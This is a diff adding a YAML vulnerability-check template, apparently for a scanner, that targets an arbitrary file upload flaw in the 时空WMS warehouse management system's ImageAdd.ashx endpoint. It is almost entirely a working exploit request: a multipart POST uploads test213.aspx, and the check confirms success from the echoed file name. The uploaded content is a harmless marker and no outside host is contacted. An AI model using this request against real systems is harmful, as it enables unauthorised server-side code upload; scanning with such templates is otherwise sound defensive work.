@@ -1,0 +1,29 @@
+id:
+
+info:
+  name: 时空WMS-仓储精细化管理系统 ImageAdd.ashx 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /ImageUpload/ImageAdd.ashx
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Upgrade-Insecure-Requests: 1
+    Accept-Encoding: gzip
+  data: |
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="file"; filename="test213.aspx"
+    Content-Type: text/plain
+
+    123456
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+response1:
+  headers:
+  body: test213.aspx
+  code: 200
+requests2:
+response2:
